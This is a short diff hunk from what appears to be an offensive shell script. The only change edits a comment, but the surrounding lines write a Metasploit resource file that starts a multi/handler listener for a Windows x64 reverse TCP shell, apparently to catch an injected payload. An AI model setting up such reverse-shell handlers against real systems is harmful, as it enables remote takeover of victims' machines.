@@ -21,7 +21,7 @@ else
     exit 1
 fi
 
-# Create handler for simple shell (not meterpreter)
+# Create handler for simple shell
 cat > injection_handler.rc << EOF
 use exploit/multi/handler
 set payload windows/x64/shell_reverse_tcp
